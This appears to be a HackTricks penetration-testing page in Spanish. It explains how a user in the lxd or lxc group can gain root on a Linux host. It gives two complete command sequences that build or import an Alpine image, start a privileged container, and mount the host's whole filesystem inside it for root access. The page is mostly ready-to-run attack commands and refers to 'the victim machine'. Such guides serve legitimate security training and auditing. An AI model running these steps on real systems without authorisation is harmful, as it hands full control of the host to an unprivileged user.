# Grupo lxd/lxc - escalada de privilegios

{{#include ../../../banners/hacktricks-training.md}}

Si perteneces al grupo _**lxd**_ o _**lxc**_, puedes convertirte en root

## Exploiting sin internet

### Método 1

Puedes descargar una imagen de alpine para usarla con lxd desde un repositorio de confianza.  
Canonical publica compilaciones diarias en su sitio: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
Simplemente descarga **lxd.tar.xz** y **rootfs.squashfs** de la compilación más reciente. (El nombre del directorio es la fecha).

Como alternativa, puedes instalar en tu máquina este distro builder: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (sigue las instrucciones de github):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Sube los archivos **incus.tar.xz** (**lxd.tar.xz** si los descargaste del repositorio de Canonical) y **rootfs.squashfs**, añade la image al repo y crea un container:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
> Run **`lxd init`** and configura todas las opciones con los valores predeterminados. Luego **repite el bloque anterior de comandos**

Finalmente, puedes ejecutar el contenedor y obtener root:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Método 2

Construye una imagen Alpine e iníciala usando el flag `security.privileged=true`, forzando al contenedor a interactuar como root con el sistema de archivos del host.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
